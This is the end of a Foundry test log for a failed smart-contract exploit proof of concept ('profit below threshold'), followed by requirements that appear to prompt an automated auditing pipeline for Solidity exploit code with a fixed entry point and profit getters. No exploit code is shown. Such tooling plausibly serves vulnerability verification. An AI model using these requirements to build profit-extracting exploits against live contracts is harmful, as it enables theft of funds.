    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [305] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [304] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 37.82s (33.57s CPU time)

Ran 1 test suite in 38.06s (37.82s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 784714)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
